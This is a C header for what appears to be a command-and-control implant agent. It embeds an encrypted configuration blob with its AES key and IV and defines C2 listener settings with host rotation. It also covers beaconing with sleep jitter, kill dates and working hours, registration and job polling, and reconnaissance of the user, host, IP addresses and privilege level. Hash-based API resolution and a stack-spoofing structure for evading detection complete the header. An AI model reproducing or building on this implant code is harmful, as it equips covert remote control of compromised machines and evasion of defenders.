#pragma once
#include "Common/Common.h"
#include "evasion/stackspoof/spoof.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0x96,0xf4,0x4d,0x0c,0x98,0x28,0xca,0x31,0x45,0x32,0xe5,0xbf,0xc2,0xce,0x2e,0x07,0xfa,0x04,0xc1,0xd6,0xfe,0xf3,0x8b,0x7f,0x35,0x8a,0xaf,0x34,0x05,0x83,0x8d,0x89,0x87,0xf9,0x22,0x26,0xe8,0x3e,0x3d,0x7b,0x56,0x34,0x37,0x42,0xac,0x85,0x5c,0xc8,0x2c,0x70,0x5a,0xe8,0x2d,0x26,0xbc,0xb9,0x75,0x96,0x3e,0xf9,0xdb,0xe1,0xb7,0xd2,0xe5,0x36,0x3c,0xa5,0x84,0x29,0x91,0x79,0x3b,0x99,0x0d,0x4c,0xe6,0xf4,0x78,0xfb,0xfe,0x42,0xcc,0x21,0x31,0x11,0x3c,0xe8,0x3b,0xda,0x6a,0x08,0x4a,0x74,0xfd,0x4b,0xdb,0x21,0x2e,0x29,0xca,0x28,0x8c,0x78,0xd0,0x2d,0x13,0x36,0xc7,0xb1,0x7f,0xb1,0x2e,0x4d,0xa9,0x7c,0x72,0x05,0xc7,0x18,0x52,0x17,0x49,0xb8,0xe5,0x81,0x85,0xbc,0x00,0x34,0xfb,0x12,0x65,0x2c,0x8b,0x08,0x23,0x9f,0x27,0x0f,0xe4,0xd4,0x80,0xde,0xf2,0x9a,0xef,0x93,0x9f,0x4a,0x9f,0xc9,0x8f,0x3f,0x57,0xa8,0xc0,0xf0,0x2b,0x1e,0x28,0x17,0x21,0x5c,0xc0,0xb2,0x6c,0xe1,0x0f,0x03,0x29,0x78,0x63,0x0d,0x1d,0x25,0x78,0x66,0x5a,0x0d,0x7c,0xa6,0x24,0xab,0x98,0x22,0x46,0x05,0x2a,0x8f,0xd4,0x62,0x87,0xe4,0x07,0xbb,0xb2,0x58,0x45,0x5c,0x6a,0xe5,0x66,0xf7,0xbd,0x8d,0xbf,0x5d,0xd6,0x53,0xaf,0x11,0x05,0x34,0xc9,0xe8,0x2d,0xd6,0xe1,0xfa,0x13,0x88,0x27,0xcf,0xce,0xdb,0x0f,0xe1,0x0a,0xea,0x67,0xa7,0xcb,0x36,0xaa,0x4d,0x7f,0x6f,0x7f,0xed,0x2d,0x29,0xda,0x77,0xee,0xab,0x42,0x99,0x66,0x6c,0xb5,0x50,0xf3,0x9c,0x0e,0xd2,0xe8,0x7d,0xee,0x27,0xed,0x9f,0x4b,0x7e,0xf1,0x5f,0x36,0x01,0xc2,0x49,0x02,0xd3,0x2f,0xfd,0x16,0x17,0xd3,0x8f,0x7d,0x0d,0xae,0x2a,0x80,0x1f,0x2c,0x65,0x40,0xd7,0x9d,0xc2,0xf8,0x1e,0xfe,0xcf,0x58,0x12,0x7e,0xce,0x64,0x3d,0x9c,0x5e,0xc1,0xba,0x4c,0x60,0xd8,0x46,0xc6,0x1f,0xd4,0x5a,0xa7,0x20,0x21,0x55,0x83,0x7f,0x50,0xa0,0x07,0xa2,0x0a,0x6a,0xf2,0xe6,0x5d,0x46,0x8f,0xb4,0x24,0xfa,0x36,0x41,0xcf,0x62,0xde,0x4c,0xa7,0x48,0x0c,0x54,0xf2,0x45,0x2b,0x8e,0x88,0xaf,0xf1,0x38,0x84,0x1f,0xaa,0xbd,0xe4,0x8b,0xdb,0xc8,0x3a,0x6d,0x66,0x9b,0x86,0xe5,0x69,0xd3,0x4a,0x50,0x23,0x6b,0x88,0xf4,0xdd,0x7d,0x35,0x4a,0x3c,0x68,0x7c,0xa3,0xaf,0x40,0x7c,0x1d,0xb9,0xff,0x9e,0x84,0x7d,0x1a,0xce,0x7e,0x45,0x3d,0x22,0xb5,0x47,0x82,0xf1,0xfc,0xff,0x00,0xca,0xb0,0x19,0xbf,0x5a,0x42,0xcf,0xb6,0x7f,0xbd,0x0b,0x98,0x57,0x4e,0x91,0x97,0xdb,0x29,0xf1,0xd1,0xa4,0xf3,0x2c,0x74,0xd3,0xcd,0x32,0x0f,0x7a,0x6b,0xd9,0xb4,0x90,0x1e,0xab,0x7c,0xb5,0xfc,0xd5,0x66,0x54,0x05,0x89,0x55,0x09,0x83,0x51,0xe5,0xa3,0xd8,0x9f,0x18,0x8a,0x95,0xc9,0x3c,0x1f,0x56,0xee,0x41,0xe9,0xb1,0x58,0x25,0xfd,0x88,0xe1,0x7d,0x65,0x8b,0xc3,0xa3,0x2e,0x26,0x7d,0xb1,0x26,0x83,0x57,0x47,0x5a,0xd5,0x26,0x18,0xca,0x0f,0x8f,0xd8,0x33,0xe1,0x3c,0xdf,0x28,0xe7,0xe0,0x37,0x67,0xa1,0x98,0x04,0xd0,0x09,0x7e,0x23,0x0c,0x81,0x8c,0xc4,0x03,0x3b,0xeb,0xba,0x43,0xd9,0x3b,0xff,0x81,0xe5,0xde,0x61,0xc8,0x34,0x69,0x48,0x42,0xad,0x33,0x57,0x91,0xcd,0xbc,0xfc,0xbc,0x69,0x38,0x59,0x6c,0xc3,0x9a,0x54,0xaf,0x95,0x04,0xac,0xf0,0x96,0xd1,0x56,0xd5,0x46,0x09,0x21,0x73,0x0d,0xff,0xff,0xe3,0x5c,0xa0,0xa5,0xb7,0x97,0x3d,0x1c,0x93,0x09,0x0a,0x6d,0x04,0x3a,0xce,0xf8,0x78,0xda,0xce,0x32,0x75,0x2e,0x1a,0xac,0xf6,0xbc,0xb6,0x98,0x86,0x94,0xfe,0x16,0xbe,0x18,0x36,0x2f,0x7b,0x93,0x25,0xff,0x41,0x53,0xc6,0x32,0x25,0xa8,0xca,0xef,0x5a,0x08,0xc7,0xa9,0x95,0xc9,0x7b,0xc5,0xb9,0x2a,0xa4,0x85,0x46,0x17,0xcf,0x36,0x28,0x2f,0xee,0x56,0x47,0xb6,0xee,0xc9,0xa0,0x45,0xd7,0xcf,0xb9,0xc3,0xf6,0x0f,0xb6,0x2b,0x62,0x59,0x26,0x2d,0x84,0x5f,0x31,0x01,0x74,0xb9,0xec,0x1d,0xb2,0x01,0x70,0xcc,0x4a,0x04,0x90,0xb2,0x23,0x75,0x71,0xe3,0x55,0x05,0xed,0x99,0xbe,0x88,0x83,0xee,0x73,0xbd,0x52,0xf6,0x7d,0x6d,0x24,0x8e,0xd3,0x92,0xc4,0x84,0x7a,0x57,0x8c,0xc4,0x92,0x02,0xad,0x21,0xb6,0x0b,0x3c,0xfc,0x3a,0x67,0xd3,0x13,0x85,0x34,0x8c,0x88,0x86,0x18}
 #define CONFIG_KEY_BYTES {0xa4,0xff,0xa6,0x1e,0x0d,0x7b,0x3c,0x12,0xe9,0x4d,0xb3,0xbc,0x20,0xa6,0xf7,0xb0,0x87,0x1d,0x71,0xe7,0x7d,0xb8,0xd2,0xb7,0x52,0xe7,0x14,0x64,0x38,0x0b,0xd3,0x7e}
 #define CONFIG_IV_BYTES {0xa9,0x04,0xe3,0x4d,0x21,0x97,0x7d,0xef,0x26,0x8b,0x58,0xb6,0x05,0x79,0xcd,0xd9}
 #define HASH_CONFIG_BYTES {0xe0,0xae,0xb8,0x72,0x7e,0xb4,0x88,0xbc,0x8a,0x24,0x90,0x9c,0x44,0x23,0x85,0xc3,0x0f,0x83,0x3a,0x80,0x1f,0x98,0x1c,0x86,0xca,0x93,0x2f,0x0f,0xdf,0xc4,0x94,0x87,0xa3,0x7b,0x66,0x00,0x58,0xb5,0x4a,0x6f,0x9d,0x08,0xc8,0x58,0xf3,0x6b,0xa4,0x56,0xd5,0x93,0xe9,0x53,0x79,0xb7,0xee,0x5c,0xc3,0x2e,0xae,0x30,0x75,0x1d,0x43,0x4a,0x8c,0x34,0x83,0x02,0x68,0x80,0xe8,0x92,0x97,0x3d,0x8f,0x42,0x53,0xc0,0xe2,0x09,0x2a,0x60,0x24,0x07,0xd5,0xb1,0xf6,0x95,0x78,0x77,0xdc,0xff,0xc1,0x6c,0x13,0xb2,0x52,0x06,0x37,0xd0,0x93,0x0f,0x91,0x51,0xf7,0x74,0x2b,0x81,0xda,0x23,0xaa,0xa9,0x95,0xe2,0x8d,0xb7,0x4d,0xec,0x07,0x04,0xea,0x05,0x18,0xf5,0x5a,0x82,0xe0,0xb8,0x4a,0x5b,0x63,0x6f,0xe8,0xef,0x1e,0x93,0x8c,0xd7,0xcb,0x24,0x8f,0xe3,0x52,0xc9,0x86,0x66,0x0f,0xbe,0x62,0xac,0x5d,0x47,0xbd,0xac,0x2c,0x50,0xda,0x86,0xd8,0x21,0xd8,0x4e,0x7e,0x24,0xea,0x6b,0x26,0xd9,0xb9,0xb0,0x58,0xa6,0x1d,0x98,0xb5,0x49,0x73,0x86,0xec,0x57,0x43,0xad,0x3d,0xd7,0xab,0xe4,0x9e,0xbc,0xae,0x3b,0x67,0x1d,0x8d,0x3e,0x24,0x96,0x61,0x37,0x42,0x01,0xed,0xd5,0xa3,0x40,0xf7,0xd8,0x0c,0xa0,0x86,0x9a,0xb8,0x85,0x2b,0x30,0x78,0xab,0xdc,0x5b,0x1a,0x76,0x1b,0x32,0xd1,0x9f,0xb7,0x29,0x39,0x45,0x38,0x3f,0x29,0x77,0xcd,0xca,0x81,0x33,0x3d,0x60,0xdd,0x71,0xde,0x13,0xec,0x7c,0x47,0x6c,0x6a,0x94,0x24,0xdc,0x84,0x62,0x88,0x8b,0x37,0x5c,0xb6,0x72,0x74,0xfa,0x1c,0x52,0x37,0x5c,0x82,0xac,0xe2,0xc5,0x92,0xae,0x23,0x39,0xfc,0x3a,0xf5,0x68,0x55,0x04,0x49,0x55,0xa5,0xc1,0xf2,0x72,0x05,0xa6,0x21,0x9b,0xd5,0x38,0x2d,0x02,0xbb,0x80,0x30,0x0d,0xec,0x11,0x39,0x09,0xbc,0x42,0xb2,0x00,0x4a,0x5d,0xbc,0xf9,0xab,0xb6,0xbc,0x11,0x7c,0xde,0x98,0x3c,0xa7,0x71,0xba,0x78,0xf8,0x2e,0xb8,0x95,0xfc,0x17,0x2f,0xe9,0xe1,0x17,0x05,0x84,0x11,0x68,0xa8,0xb4,0x7f,0xad,0x1b,0x2d,0xf5,0x37,0x1d,0x84,0x13,0x5e,0xc9,0x0f,0x9b,0x33,0xb0,0x09,0xd4,0x1d,0xe7,0x38,0x59,0x97,0x51,0xcd,0x94,0x85,0x45,0xbe,0x52,0x63,0x19,0x77,0xa3,0x8e,0xd0,0x17,0x40,0x85,0xac,0xbe,0xf6,0x23,0xa6,0xa9,0x12,0x8e,0x6a,0x1d,0x6f,0x0d,0xa4,0x8a,0xe4,0x55,0xcb,0xf7,0x53,0xff,0x78,0xf8,0x32,0xb3,0x47,0x5d,0xb9,0xfa,0x84,0x39,0x74,0x89,0xbe,0x13,0x34,0x7a,0x5b,0xbd,0x46,0x0e,0x61,0x7c,0xf9,0xe2,0xb7,0x77,0x49,0x1c,0xef,0xec,0x19,0x9b,0x47,0x3c,0xd6,0x69,0x74,0x42,0xf6,0x85,0xfc,0x64,0x1a,0x55,0xa8,0x94,0x05,0x74,0x27,0x92,0xd3,0x3d,0xed,0x8a,0xce,0x16,0x2d,0xca,0xb9,0xb1,0x92,0xbc,0xd9,0xcd,0x71,0x2d,0x4c,0xde,0x72,0x3e,0xd5,0xbf,0x07,0xc3,0x69,0xa5,0xc5,0xf2,0xc2,0xc9,0x24,0xca,0x2c,0x0a,0x45,0x90,0xef,0x60,0x2a,0x2e,0xf8,0xf0,0x84,0xf6,0xb5,0x52,0xb3,0x75,0xf9,0xef,0x35,0x62,0x27,0x0d,0x37,0x81,0x61,0x03,0x3b,0x14,0x74,0x5e,0xd9,0x78,0x5d,0x2a,0xa3,0xb7,0x1e,0xeb,0x69,0xdd,0x05,0x9d,0xb1,0xdc,0xe0,0x80,0xe7,0x11,0x44,0xf2,0xb9,0x11,0x12,0x8d,0x8d,0x0d,0xa4,0x8f,0x58,0x3a,0x9d,0x94,0x4e,0x10,0x6d,0xae,0x7b,0xb6,0xc3,0xe8,0xf0,0x66}
 #define HASH_KEY_BYTES {0x63,0x57,0xf7,0x2c,0x39,0xeb,0xd4,0xbd,0xd6,0x7c,0xd3,0x97,0x7a,0x78,0x03,0x37,0x1a,0x75,0x8b,0xdd,0xb4,0xa1,0x73,0xde,0x46,0x1e,0xd5,0x0e,0x8d,0x61,0x3f,0xd3}
 #define HASH_IV_BYTES {0xe2,0x44,0x07,0x95,0x30,0x7e,0x8d,0xe3,0x67,0x03,0xf5,0xe0,0x04,0xbd,0x8a,0x55}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;



typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;
	BOOL JmpRbx;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;
	t_LdrGetProcedureAddress pLdrGetProcedureAddress;
	t_NtQueryVirtualMemory pNtQueryVirtualMemory;
	UINT64 RtlUserThreadStartHash;
	t_NtOpenThread pNtOpenThread;
	t_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
	t_NtProtectVirtualMemory pNtProtectVirtualMemory;
	t_NtCreateThreadEx pNtCreateThreadEx;

	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;
	HMODULE hCryptSp;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

	//Kernelbase APIS
	HMODULE hKernelBase;
	UINT64 BaseThreadInitThunkHash;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

typedef struct _MoonWalking {
	PVOID RetAddr;
	PVOID FunctionPointer;
	PArgs Arguments;
} MoonWalking, * pMoonWalking;

typedef struct _PEINFO {
	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	//Number of Sections
	DWORD NumSections;
} PEINFO, * pPEINFO;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {

	//win32 apis
	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	pPEINFO PEInfo;

	//TEB struct.
	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;

	//moonwalking structure.
	pMoonWalking Walker;

}Agent, * pAgent;

extern pAgent agent;

typedef enum  {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
} Agent_Operations;


INT init_agent(PVOID RetAddress);
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();